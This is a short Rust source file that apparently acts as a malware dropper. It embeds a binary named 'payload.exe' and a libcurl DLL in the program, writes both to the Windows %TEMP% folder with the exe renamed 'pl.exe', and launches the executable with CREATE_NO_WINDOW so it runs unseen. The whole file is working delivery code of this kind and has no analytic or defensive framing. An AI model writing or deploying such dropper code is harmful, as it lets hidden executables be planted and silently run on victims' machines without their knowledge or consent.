use std::path::PathBuf;
use std::process::Command;

const PAYLOAD_BYTES: &[u8] = include_bytes!("../payload.exe");
const CURL_DLL: &[u8] = include_bytes!("../libcurl-x64.dll");

/// Write the embedded EXE + libcurl DLL to %TEMP% and launch the EXE.
pub fn deploy_and_launch() -> Result<(), String> {
    let tmp = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
    let exe_path = PathBuf::from(&tmp).join("pl.exe");
    let dll_path = PathBuf::from(&tmp).join("libcurl-x64.dll");

    std::fs::write(&exe_path, PAYLOAD_BYTES)
        .map_err(|e| format!("write exe failed: {e}"))?;
    std::fs::write(&dll_path, CURL_DLL)
        .map_err(|e| format!("write dll failed: {e}"))?;

    let mut cmd = Command::new(&exe_path);
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        cmd.creation_flags(0x08000000); // CREATE_NO_WINDOW
    }
    cmd.spawn().map_err(|e| format!("spawn failed: {e}"))?;
    Ok(())
}
